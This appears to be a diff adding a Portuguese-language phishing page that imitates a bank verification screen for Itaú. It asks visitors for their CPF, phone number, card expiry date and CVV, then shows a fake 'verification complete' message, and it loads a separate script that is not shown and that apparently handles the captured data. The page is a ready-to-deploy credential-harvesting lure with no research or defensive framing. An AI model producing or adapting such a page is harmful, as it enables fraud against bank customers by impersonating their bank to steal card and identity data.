@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Validação Itaú</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <header>
+    <img src="logo2.png" alt="Logo" class="logo" />
+  </header>
+
+  <div class="container">
+    <div class="steps">
+      <div class="line"></div>
+      <div id="step1" class="step active">1</div>
+      <div id="step2" class="step">2</div>
+      <div id="step3" class="step">3</div>
+    </div>
+
+    <p class="subtext">Preencha seus dados para continuar.</p>
+
+    <div class="form-container">
+      <input id="cpf" type="text" placeholder="CPF" />
+      <input id="telefone" type="text" placeholder="Telefone" />
+      <input id="validade" type="text" placeholder="Validade (MM/AA)" />
+      <input id="cvv" type="text" placeholder="CVV" />
+      <button id="btnContinuar" disabled>Continuar</button>
+    </div>
+
+    <div id="loading" style="display: none; text-align: center;">
+      <img src="load.gif" alt="validando dados..." width="100" />
+      <p>Validando informações...</p>
+    </div>
+
+    <div id="step-3" style="display: none; text-align: center;">
+      <h2>Verificação Concluida</h2>
+      <p>Informações validadas com sucesso.</p>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
